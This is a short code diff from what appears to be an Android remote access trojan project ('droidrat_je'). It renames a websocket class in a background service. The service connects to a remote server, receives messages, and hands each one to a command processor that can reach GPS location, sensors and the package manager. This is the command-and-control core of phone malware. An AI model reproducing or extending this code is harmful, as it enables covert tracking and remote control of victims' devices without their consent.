@@ -16,13 +16,13 @@ import androidx.annotation.Nullable;
 
 import com.je_chen.droidrat_je.rat.command.process_super.CommandProcess;
 import com.je_chen.droidrat_je.service.receiver.ServiceLive;
-import com.je_chen.droidrat_je.util.socket.websocket.Websockets;
+import com.je_chen.droidrat_je.util.socket.websocket.DroidRatWebSocketClient;
 
 import java.net.URI;
 
 public class ProcessCommandService extends Service {
 
-    public static Websockets websockets;
+    public static DroidRatWebSocketClient droidRatWebSocketClient;
     final String TAG = "ProcessCommandService ";
     PackageManager packageManager;
 
@@ -76,15 +76,15 @@ public class ProcessCommandService extends Service {
             commandProcess = new CommandProcess(getApplicationContext(), packageManager, sensorManager, locationManager, "gps", 5000, 5);
 
             URI uri = URI.create(serverURI);
-            websockets = new Websockets(uri, packageManager, this) {
+            droidRatWebSocketClient = new DroidRatWebSocketClient(uri, packageManager, this) {
                 @Override
                 public void onMessage(String message) {
                     Log.v(TAG, "Receiver : " + message);
                     commandProcess.processString(message);
                 }
             };
-            if (!websockets.isOpen())
-                websockets.connect();
+            if (!droidRatWebSocketClient.isOpen())
+                droidRatWebSocketClient.connect();
         } catch (Exception e) {
             e.printStackTrace();
         }
